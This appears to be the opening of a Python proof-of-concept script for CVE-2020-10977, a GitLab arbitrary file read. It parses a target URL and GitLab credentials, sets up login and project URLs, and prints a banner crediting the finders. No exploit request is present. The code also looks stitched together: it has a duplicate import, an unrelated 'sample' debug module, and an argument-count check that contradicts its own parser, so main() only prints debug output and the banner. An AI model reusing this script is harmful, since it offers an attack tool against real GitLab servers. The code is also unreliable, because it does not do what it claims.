#!/usr/bin/env python3

import sys
import sys
import json
import requests
import argparse
from bs4 import BeautifulSoup

from sample import *

# Read arguments and set up constants 
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument('url', help='Target URL with http(s)://')
parser.add_argument('username', help='GitLab Username')
parser.add_argument('password', help='GitLab Password')
args = parser.parse_args()

base_url = args.url
if base_url.startswith('http://') or base_url.startswith('https://'):
	pass
else:
	print('[-] Include http:// or https:// in the URL!')
	sys.exit()
if base_url.endswith('/'):
	base_url = base_url[:-1]

username = args.username
password = args.password

login_url = base_url + '/users/sign_in'
project_url = base_url + '/projects/new'
create_url = base_url + '/projects'
prev_issue_url = ''
csrf_token = ''
project_names = ['ProjectOne', 'ProjectTwo']

session = requests.Session()



def banner():
	print('-'*34)
	print('--- CVE-2020-10977 ---------------')
	print('--- GitLab Arbitrary File Read ---')
	print('--- 12.9.0 & Below ---------------')
	print('-'*34 + '\n')
	print('[>] Found By : vakzz       [ https://hackerone.com/reports/827052 ]')
	print('[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t      ]\n\n')
	print('[+] Target        : ' + base_url)
	print('[+] Username      : ' + username)
	print('[+] Password      : ' + password)
	print('[+] Project Names : {}, {}\n'.format(project_names[0], project_names[1]))

def debug(args, out):
  print("debug info:")
  print(Sample.print_vars(out))
  

def main():
  args = sys.argv
  if len(args) != 3:
    out = Sample()
    debug(args, out)
    banner()

    return
  else:
    pass

if __name__ == "__main__":
  main()